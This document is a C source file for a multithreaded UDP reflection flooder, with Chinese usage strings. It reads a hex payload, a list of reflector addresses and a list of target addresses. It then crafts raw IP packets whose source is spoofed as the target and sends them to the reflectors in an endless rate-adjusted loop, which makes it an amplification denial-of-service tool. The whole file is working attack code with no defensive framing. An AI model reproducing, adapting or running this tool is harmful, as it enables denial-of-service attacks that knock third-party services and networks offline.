#include <netinet/udp.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>

#define MAX_PACKET_SIZE 4096

unsigned int PORT;
unsigned char *payload = NULL;
size_t        payload_len = 0;

volatile int data_pps = 0;
volatile int time_pps = 100;
volatile int ip_num = 1;
volatile int ip_dum = 1;
volatile int max_pps;

struct sockaddr_in *addr;
struct sockaddr_in *dddr;

typedef struct {
  uint32_t state;
} Xorshift32;

void xorshift32_init(Xorshift32 *rng, uint32_t seed) {
  if (seed == 0) seed = 1;
  rng->state = seed;
}

uint32_t xorshift32_next(Xorshift32 *rng) {
  uint32_t x = rng->state;
  x ^= x << 13;
  x ^= x >> 17;
  x ^= x << 5;
  rng->state = x;
  return x;
}

unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum = 0;
  while (nwords-- > 0) sum += *buf++;
  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

char* trim(char *s) {
  char *end;
  while (isspace((unsigned char)*s)) s++;
  if (*s == 0) return s;
  end = s + strlen(s) - 1;
  while (end > s && isspace((unsigned char)*end)) end--;
  *(end+1) = '\0';
  return s;
}

FILE *file;
Xorshift32 rng;

unsigned char *parse_hex_payload(const char *s, size_t *out_len) {
  size_t sl = strlen(s), i = 0, j = 0;
  unsigned char *buf = malloc(sl);
  if (!buf) {
    perror("parse_hex_payload malloc");
    exit(1);
  }
  while (i < sl) {
    if (s[i] == '\\' && i + 3 < sl &&
      (s[i+1] == 'x' || s[i+1] == 'X') &&
      isxdigit((unsigned char)s[i+2]) &&
      isxdigit((unsigned char)s[i+3])) {
      char hex[3] = { s[i+2], s[i+3], '\0' };
      buf[j++] = (unsigned char)strtol(hex, NULL, 16);
      i += 4;
    } else {
      buf[j++] = (unsigned char)s[i++];
    }
  }
  *out_len = j;
  return buf;
}

typedef struct {
  struct sockaddr_in addrs;
  struct sockaddr_in sddrs;
} thread_data;

void *flood(void *arg) {
  thread_data *data = arg;
  char buffer[MAX_PACKET_SIZE];
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  if (sock < 0) { perror("socket"); exit(1); }

  int one = 1;
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
    perror("No IP_HDRINCL"); exit(1);
  }

  memset(buffer, 0, MAX_PACKET_SIZE);
  struct iphdr  *iph  = (struct iphdr  *)buffer;
  struct udphdr *udph = (struct udphdr *)(buffer + sizeof(*iph));

  int psize = sizeof(*iph) + sizeof(*udph);
  size_t slen = payload_len;
  memcpy(buffer + psize, payload, slen);

  struct sockaddr_in sin = {
    .sin_family = AF_INET,
    .sin_port   = htons(PORT)
  };

  iph->ihl     = 5;
  iph->version = 4;
  iph->tos     = 0;
  iph->tot_len = htons(psize + slen);
  iph->frag_off= 0;
  iph->ttl     = MAXTTL;
  iph->protocol= IPPROTO_UDP;
  iph->check   = 0;

  udph->len    = htons(sizeof(*udph) + slen);
  udph->dest   = htons(PORT);
  udph->source = data->addrs.sin_port;
  udph->check  = 0;

  int i = 0;
  int o = 0;
  while (1) {
    iph->daddr = addr[i].sin_addr.s_addr;
    iph->id    = htons((xorshift32_next(&rng) & 0xec77) + 5000);
    iph->saddr = dddr[o].sin_addr.s_addr;
    iph->check = csum((unsigned short*)iph, sizeof(*iph));

    sin.sin_addr.s_addr  = addr[i].sin_addr.s_addr;
    // udph->source = htons((xorshift32_next(&rng) & 0xfbff) + 1024);
    sendto(sock, buffer, ntohs(iph->tot_len), 0,
           (struct sockaddr*)&sin, sizeof(sin));
    data_pps++;

    i = (i + 1) % (ip_num - 1);
    o = (o + 1) % (ip_dum - 1);

    if (max_pps > 0) {
      if (data_pps > max_pps) {
        usleep(time_pps * 1000);
        time_pps += 100;
      } else {
        time_pps = (time_pps <= 100 ? 100 : time_pps - 10);
      }
    }
  }
}

int main(int argc, char *argv[]) {
  if (argc != 8) {
    printf("Usage: %s <配置文件> <目标文件> <端口> <反射IP文件> <线程> <每秒PPS> <持续时间>\n", argv[0]);
    exit(1);
  }

  // 初始化线程数据
  thread_data data = {
    .addrs = {
      .sin_port      = htons(atoi(argv[3]))
    }
  };

  max_pps      = atoi(argv[6]);
  int thread_count = atoi(argv[5]);

  // 读取配置文件
  file = fopen(argv[1], "r");
  if (!file) { perror("NO Config"); exit(1); }

  char line[256];
  while (fgets(line, sizeof(line), file)) {
    char *s = trim(line);
    if (*s=='\0' || *s=='#' || *s==';') continue;
    char *eq = strchr(s, '=');
    if (!eq) continue;
    *eq = '\0';
    char *key   = trim(s);
    char *value = trim(eq + 1);

    if (strcmp(key, "port") == 0) {
      PORT = atoi(value);
    }
    else if (strcmp(key, "payload") == 0) {
      free(payload);
      payload = parse_hex_payload(value, &payload_len);
      printf("[+] 负载解析完毕，长度 = %zu 字节\n", payload_len);
    }
  }
  fclose(file);

  addr = malloc(sizeof(*addr) * ip_num);
  if (!addr) { perror("No addr"); exit(1); }

  file = fopen(argv[4], "r");
  if (!file) { perror("反射 IP 文件 打开失败"); exit(1); }
  while (fgets(line, sizeof(line), file)) {
    line[strcspn(line, "\r\n")] = '\0';
    if (line[0]=='\0') continue;
    addr[ip_num-1].sin_family = AF_INET;
    addr[ip_num-1].sin_addr.s_addr = inet_addr(line);
    ip_num++;
    addr = realloc(addr, sizeof(*addr) * ip_num);
    if (!addr) { perror("No tmp"); exit(1); }
  }

  dddr = malloc(sizeof(*dddr) * ip_num);
  if (!dddr) { perror("No addr"); exit(1); }

  file = fopen(argv[2], "r");
  if (!file) { perror("目标 IP 文件 打开失败"); exit(1); }
  while(fgets(line, sizeof(line), file)) {
    line[strcspn(line, "\r\n")] = '\0';
    if (line[0]=='\0') continue;
    dddr[ip_dum-1].sin_family = AF_INET;
    dddr[ip_dum-1].sin_addr.s_addr = inet_addr(line);
    ip_dum++;
    dddr = realloc(dddr, sizeof(*dddr) * ip_dum);
    if (!dddr) { perror("No tmp"); exit(1); }
  }
  fclose(file);

  pthread_t threads[thread_count];
  xorshift32_init(&rng, (uint32_t)time(NULL));
  for (int i = 0; i < thread_count; i++) {
    pthread_create(&threads[i], NULL, flood, &data);
  }
  printf("开始泛洪...\n");

  int time_max = atoi(argv[7]);
  while (time_max-- > 0) {
    data_pps = 0;
    sleep(1);
  }
}
